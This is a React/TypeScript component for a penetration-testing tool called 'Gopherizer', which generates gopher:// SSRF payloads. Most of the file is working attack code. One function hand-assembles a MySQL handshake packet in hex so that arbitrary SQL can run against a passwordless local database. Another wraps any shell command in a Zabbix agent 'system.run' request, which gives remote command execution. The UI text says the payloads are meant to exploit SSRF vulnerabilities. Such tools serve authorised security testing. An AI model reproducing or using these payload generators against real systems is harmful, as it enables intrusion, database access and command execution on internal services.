import React, { useState, useEffect } from 'react';
import { Card, Input, TextArea, Button, Select , Toast } from '../../../components/ui';
import { Copy, Database, Server, Terminal } from 'lucide-react';

export default function GopherizerTool() {
    const [payloadType, setPayloadType] = useState('mysql');
    const [username, setUsername] = useState('');
    const [query, setQuery] = useState('');
    const [zabbixCommand, setZabbixCommand] = useState('whoami');
    const [output, setOutput] = useState('');
    const [showToast, setShowToast] = useState(false);

    const PAYLOAD_OPTIONS = [
        { label: 'MySQL (No Auth)', value: 'mysql' },
        { label: 'Zabbix (Remote Command)', value: 'zabbix' },
    ];

    // Logic extracted from HackTools storage
    const generateMySQLGopherPayload = (user: string, sql: string) => {
        const encoder = new TextEncoder();
        const encodeToHex = (input: string) =>
            Array.from(encoder.encode(input), (byte) =>
                ("0" + byte.toString(16)).slice(-2)
            ).join("");

        const usernameHex = encodeToHex(user);
        const userLength = user.length;
        const temp = userLength - 4;
        const length = (0xa3 + temp).toString(16).padStart(2, "0");

        let dump =
            length +
            "00000185a6ff0100000001210000000000000000000000000000000000000000000000";
        dump += usernameHex;
        dump +=
            "00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c";
        dump +=
            "69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d";
        dump += "067838365f36340c70726f6772616d5f6e616d65056d7973716c";

        const auth = dump.replace("\n", "");

        const encode = (s: string) => {
            const hexArray = s.match(/.{1,2}/g) || [];
            return "gopher://127.0.0.1:3306/_%" + hexArray.join("%");
        };

        if (sql.trim() !== "") {
            const queryHex = encodeToHex(sql);
            const queryLength = (queryHex.length / 2 + 1)
                .toString(16)
                .padStart(6, "0");
            const queryLengthHex = Array.from(queryLength.match(/.{1,2}/g) || [])
                .reverse()
                .join("");
            const pay1 = queryLengthHex + "0003" + queryHex;
            return encode(auth + pay1 + "0100000001");
        } else {
            return encode(auth);
        }
    };

    const generateZabbixGopherPayload = (command: string) => {
        const encoder = new TextEncoder();
        const encodeToHex = (input: string) =>
            Array.from(encoder.encode(input), (byte) =>
                ("0" + byte.toString(16)).slice(-2)
            ).join("");

        const payload = `system.run[(${command});sleep 2s]`;
        const payloadHex = encodeToHex(payload);

        const encode = (s: string) => {
            const hexArray = s.match(/.{1,2}/g) || [];
            return "gopher://127.0.0.1:10050/_%" + hexArray.join("%");
        };
        return encode(payloadHex);
    };

    useEffect(() => {
        let res = '';
        try {
            if (payloadType === 'mysql') {
                if (!username) {
                    // Requires username
                    res = '';
                } else {
                    res = generateMySQLGopherPayload(username, query);
                }
            } else if (payloadType === 'zabbix') {
                if (!zabbixCommand) {
                    res = '';
                } else {
                    res = generateZabbixGopherPayload(zabbixCommand);
                }
            }
            setOutput(res);
        } catch (e) {
            setOutput('Error generating payload');
        }
    }, [payloadType, username, query, zabbixCommand]);


    const copyToClipboard = () => {
        if (!output) return;
        navigator.clipboard.writeText(output);
        setShowToast(true);
        setTimeout(() => setShowToast(false), 2000);
    };

    return (
        <div className="space-y-6">
            <div>
                <h2 className="text-2xl font-black text-white">
                    Gopherizer (SSRF)
                </h2>
                <p className="text-gray-400">
                    Generate Gopher URI payloads to exploit SSRF vulnerabilities in services like MySQL and Zabbix.
                </p>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                {/* Configuration */}
                <Card className="!p-6 space-y-4 flex flex-col h-full">
                    <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider">Payload Configuration</h3>

                    <Select
                        label="Target Service"
                        options={PAYLOAD_OPTIONS}
                        value={payloadType}
                        onChange={setPayloadType}
                    />

                    {payloadType === 'mysql' && (
                        <div className="space-y-4 animate-fadeIn">
                            <Input
                                label="MySQL Username"
                                placeholder="root"
                                value={username}
                                onChange={(e) => setUsername(e.target.value)}
                            />
                            <Input
                                label="Query to Execute"
                                placeholder="SELECT version();"
                                value={query}
                                onChange={(e) => setQuery(e.target.value)}
                            />
                            <p className="text-xs text-gray-500">
                                Requires a valid username that allows access without password (or passwordless auth).
                            </p>
                        </div>
                    )}

                    {payloadType === 'zabbix' && (
                        <div className="space-y-4 animate-fadeIn">
                            <Input
                                label="Command to Execute"
                                placeholder="id"
                                value={zabbixCommand}
                                onChange={(e) => setZabbixCommand(e.target.value)}
                                icon={<Terminal size={14} />}
                            />
                        </div>
                    )}
                </Card>

                {/* Output */}
                <Card className="!p-6 space-y-4 flex flex-col h-full">
                    <div className="flex items-center justify-between">
                        <h3 className="text-sm font-bold text-gray-400 uppercase tracking-wider">Generated Payload</h3>
                        <Button
                            size="sm"
                            variant={output ? 'primary' : 'secondary'}
                            disabled={!output}
                            onClick={copyToClipboard}
                            icon={<Copy size={14} />}
                        >
                            Copy Payload
                        </Button>
                    </div>

                    <TextArea
                        readOnly
                        value={output}
                        placeholder="// Fill parameters to generate payload..."
                        className="flex-1 min-h-[200px] font-mono text-xs text-orange-300 break-all"
                    />
                </Card>
            </div>

            {/* Toast */}
                                <Toast show={showToast} message="Copied to clipboard!" />
        </div>
    );
}
